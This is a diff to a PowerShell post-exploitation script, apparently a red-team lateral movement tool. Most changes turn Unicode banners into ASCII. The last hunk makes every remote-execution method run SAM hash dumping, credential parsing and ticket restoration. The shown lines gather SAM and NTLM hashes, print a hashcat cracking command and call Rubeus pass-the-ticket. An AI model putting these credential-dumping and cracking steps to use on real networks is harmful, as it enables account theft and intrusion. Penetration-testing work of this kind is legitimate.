@@ -2237,7 +2237,7 @@ function SAM {
 
         Write-Host
         Write-Host
-        Write-Host "──────────────────────── Hashes which are valid on multiple computers ────-────────────────────" -ForegroundColor "Yellow"
+        Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
         Write-Host
 
         $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
@@ -2276,7 +2276,7 @@ function SAM {
         }
 
         Write-Host
-        Write-Host "────────────────────────────── All collected SAM Hashes (Unique) ──────────────────────────────" -ForegroundColor "Yellow"
+        Write-Host "------------------------------ All collected SAM Hashes (Unique) -------------------------------" -ForegroundColor "Yellow"
         Write-Host
 
         Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | ForEach-Object {
@@ -2298,7 +2298,7 @@ function SAM {
         Get-Content "$SAM\.Sam-Full.txt"
 
         Write-Host ""
-        Write-Host "───────────────────────────────────────────────────────────────────────────────────────────────" -ForegroundColor "Yellow"
+        Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
         Write-Host ""
         Write-Host "All SAM hashes written to $PME\SAM\.Sam-Full.txt" -ForegroundColor "Yellow"
         Write-Host ""
@@ -2377,10 +2377,10 @@ $UpdatedlLines | Set-Content -Path "$LogonPasswords\.All-Unique-NTLM.txt"
 
 # Print unique NTLM hashes within the banner
 Write-Host
-Write-Host "────────────────────────────── All collected NTLM Hashes (Unique) ──────────────────────────────" -ForegroundColor "Yellow"
+Write-Host "-------------------------------------- All collected NTLM Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
 Get-Content  -path "$LogonPasswords\.All-Unique-NTLM.txt" | Sort-Object -Unique | Format-Table -AutoSize
 Write-Host
-Write-Host "───────────────────────────────────────────────────────────────────────────────────────────────" -ForegroundColor "Yellow"
+Write-Host "----------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
 Write-Host 
 Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
 Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
@@ -2478,11 +2478,15 @@ Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
 ########## Execute defined methods ##########
 
 IF ($Method -eq "WinRM"){Method-WinRM ; SAM ; Parse-LogonPasswords ; Parse-eKeys ; RestoreTicket}
-IF ($Method -eq "MSSQL"){Method-MSSQL ; RestoreTicket}
-IF ($Method -eq "Psexec"){Method-PsExec ; SAM ; Parse-LogonPasswords ; Parse-eKeys ; RestoreTicket}
-IF ($Method -eq "WMI"){Method-WMIexec ; SAM ; Parse-LogonPasswords ; Parse-eKeys ; RestoreTicket}
+IF ($Method -eq "MSSQL"){Method-MSSQL}
+IF ($Method -eq "Psexec"){Method-PsExec}
+IF ($Method -eq "WMI"){Method-WMIexec}
 IF ($Method -eq "RDP"){Method-RDP}
 IF ($GenRelayList){Get-SMBSigning ; GenRelayList}
+SAM
+Parse-eKeys
+Parse-LogonPasswords
+RestoreTicket
         
 
 ########## Finish the script and write current time ##########
